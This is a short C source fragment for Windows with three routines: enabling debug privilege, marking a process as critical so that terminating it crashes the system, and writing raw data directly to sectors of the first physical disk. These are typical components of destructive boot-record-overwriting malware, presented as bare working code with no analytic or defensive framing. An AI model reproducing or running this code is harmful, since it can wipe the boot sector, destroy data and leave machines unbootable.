int EnableDebugPriv()
{
    HANDLE hToken;

    LUID sedebugnameValue;

    TOKEN_PRIVILEGES tkp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);

    tkp.PrivilegeCount = 1;

    tkp.Privileges[0].Luid = sedebugnameValue;

    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, false, &tkp, sizeof tkp, NULL, NULL);

    CloseHandle(hToken);
    return 0;
}

BOOL CallNtSetInformationProcess(HANDLE hProcess, ULONG Flag)
{
    _NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess");
    if (!NtSetInformationProcess)
    {
        return 0;
    }
    if (NtSetInformationProcess(hProcess, (PROCESS_INFORMATION_CLASS)ProcessBreakOnTermination, &Flag, sizeof(ULONG)) < 0)
        return 0;
    return 1;
}
int WriteHardDiskSector(unsigned char Data[],int StartingSector,int NumberOfSectorsToBeWritten)
{
    int TotalBytes;
    int deviation;
    DWORD wb;
    TotalBytes=NumberOfSectorsToBeWritten*512;
    deviation=StartingSector*512;
    HANDLE disk=CreateFileA("\\\\.\\PhysicalDrive0", 1073741824, 1, 0, 3, 128, 0);
    SetFilePointer(disk,deviation,0,0);
    WriteFile(disk,Data,TotalBytes,&wb,NULL);
    CloseHandle(disk);
    return 0;
}
